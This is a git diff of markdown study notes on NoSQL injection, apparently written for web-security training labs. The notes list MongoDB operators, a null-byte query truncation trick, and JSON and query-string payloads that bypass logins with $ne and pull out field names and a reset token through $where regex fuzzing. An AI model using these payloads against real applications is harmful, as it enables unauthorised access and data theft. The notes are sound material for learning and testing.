@@ -1,6 +1,6 @@
-[#](#) No SQL
+# No SQL
 
-Detecting:
+## Detecting:
 
 > Make sure to `CTRL+U` if used in repeater...
 > Does NOT always work, e.g.: for logins...
@@ -12,14 +12,14 @@ Detecting:
 * Null character (MongoDB): `Gifts'\u0000` -> `this.category == 'Gigts'\u0000' && this.released == 1`
     * This will terminate the query after the Null, and prevent the aditional restriction.
 
-Operators:
+## Operators:
 
 * `$Where`
 * `$Ne`
 * `$Ni`
 * `$Regex`
 
-Examples: 
+## Examples: 
 
 * `?username=wiener` -> `username[$ne]=invalid`
 * `{"username": "wiener"}` -> `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
@@ -32,4 +32,5 @@ Examples:
     * False: `{"username":"wiener","password":"peter", "$where":"0"}`
     * True: `{"username":"wiener","password":"peter", "$where":"1"}`
     * If you able to inject operator, you can extract field names: `"$where":"Object.keys(this)[0].match('^.{0}a.*')"`
-
+        * `{"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[2].match('^.{§1§}§a§.*')"}`
+        * Fuzz the field name: `{"username":"carlos","password":{"$ne": ""}, "$where":"this.pwResetTkn.match('^.{§§}§§.*')"}`
